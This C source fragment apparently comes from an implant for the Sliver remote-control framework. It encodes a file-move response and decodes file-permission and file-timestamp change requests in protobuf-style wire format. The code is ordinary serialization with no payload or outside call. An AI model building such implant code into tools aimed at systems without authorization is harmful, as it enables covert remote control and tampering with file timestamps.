}

int sliver_mv_encode(sliver_buf_t *out, const char *src, const char *dst, const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, src != NULL ? src : "") != 0 ||
      sliver_buf_put_string(out, 2, dst != NULL ? dst : "") != 0) {
    return -1;
  }
  return encode_response(out, err);
}

int sliver_chmod_req_decode(const void *data, size_t len, char *path, size_t path_cap,
                            char *mode, size_t mode_cap, int *recursive) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (path == NULL || mode == NULL || path_cap == 0 || mode_cap == 0) {
    return -1;
  }
  path[0] = 0;
  mode[0] = 0;
  if (recursive != NULL) {
    *recursive = 0;
  }
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, path, path_cap) != 0) {
        return -1;
      }
    } else if (field == 2 && wire == 2) {
      if (sliver_reader_string(&r, mode, mode_cap) != 0) {
        return -1;
      }
    } else if (field == 3 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      if (recursive != NULL) {
        *recursive = v != 0;
      }
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_chtimes_req_decode(const void *data, size_t len, char *path, size_t path_cap,
                              int64_t *atime, int64_t *mtime) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (path == NULL || path_cap == 0) {
    return -1;
  }
  path[0] = 0;
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, path, path_cap) != 0) {
        return -1;
      }
    } else if ((field == 2 || field == 3) && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      if (field == 2 && atime != NULL) {
        *atime = (int64_t)v;
      }
      if (field == 3 && mtime != NULL) {
        *mtime = (int64_t)v;
      }
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}
